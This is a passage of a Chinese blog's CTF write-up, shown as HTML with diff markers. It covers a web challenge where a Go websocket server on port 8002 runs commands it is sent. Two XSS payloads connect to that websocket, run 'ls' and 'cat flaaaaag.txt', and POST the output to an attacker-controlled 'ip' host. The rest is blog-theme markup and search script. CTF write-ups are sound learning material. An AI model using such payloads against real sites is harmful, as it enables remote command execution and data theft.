class="line">    app := sweetygo.New(<span class="string">"./"</span>, nil)</span><br><span class="line">    app.GET(<span class="string">"/ws"</span>, ws)</span><br><span class="line">    app.RunServer(<span class="string">":8002"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func ws(ctx *sweetygo.Context) &#123;</span><br><span class="line">	conn, <span class="attr">_</span> := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), <span class="number">1024</span>, <span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		m := msg&#123;&#125;</span><br><span class="line">		err := conn.ReadJSON(&amp;m)</span><br><span class="line">		<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">			fmt.Println(<span class="string">"Error reading json."</span>, err)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		res := exec(m.Cmd)</span><br><span class="line">		fmt.Println(res)</span><br><span class="line">		<span class="keyword">if</span> err = conn.WriteJSON(res); err != nil &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看上去是在8002端口启了一个websocket server,并且存在命令执行.</p>
+<p>所以思路就是利用XSS去请求websocket来执行命令.</p>
+<p>另外,如果去读整个dom的话,可以看到其它人插入的XSS,这样就能看到大佬的payload了😁</p>
+<p>payload(1):</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">	<span class="keyword">var</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">"ws://127.0.0.1:8002/ws"</span>);</span><br><span class="line">	socket.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; 	</span><br><span class="line">		socket.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">cmd</span>:<span class="string">"ls"</span>&#125;)) </span><br><span class="line">	&#125;;</span><br><span class="line">	socket.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; 	</span><br><span class="line">		$.ajax(</span><br><span class="line">		&#123;</span><br><span class="line">			type: <span class="string">"POST"</span>,</span><br><span class="line">			url: <span class="string">"//ip:1027/"</span>,</span><br><span class="line">			data: <span class="built_in">JSON</span>.parse(e.data),</span><br><span class="line">			dataType: <span class="string">"JSON"</span> 	</span><br><span class="line">		&#125;</span><br><span class="line">			); </span><br><span class="line">	&#125;; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload(2):</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">	<span class="keyword">var</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">"ws://127.0.0.1:8002/ws"</span>);</span><br><span class="line">	socket.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; 	</span><br><span class="line">		socket.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">cmd</span>:<span class="string">"cat flaaaaag.txt"</span>&#125;)) </span><br><span class="line">	&#125;;</span><br><span class="line">	socket.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; 	</span><br><span class="line">		$.ajax(</span><br><span class="line">		&#123;</span><br><span class="line">			type: <span class="string">"POST"</span>,</span><br><span class="line">			url: <span class="string">"//ip:1028/"</span>,s</span><br><span class="line">			data: <span class="built_in">JSON</span>.parse(e.data),</span><br><span class="line">			dataType: <span class="string">"JSON"</span> 	</span><br><span class="line">		&#125;</span><br><span class="line">			); </span><br><span class="line">	&#125;; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Write-Up/" rel="tag"><i class="fa fa-tag"></i> Write_Up</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/28/内网三基佬之男上♂加男/" rel="next" title="内网三基佬之男上♂加男">
+                <i class="fa fa-chevron-left"></i> 内网三基佬之男上♂加男
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/14/SSRF/" rel="prev" title="SSRF">
+                SSRF <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB-3"><span class="nav-number">3.</span> <span class="nav-text">WEB 3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB4"><span class="nav-number"></span> <span class="nav-text">WEB4</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
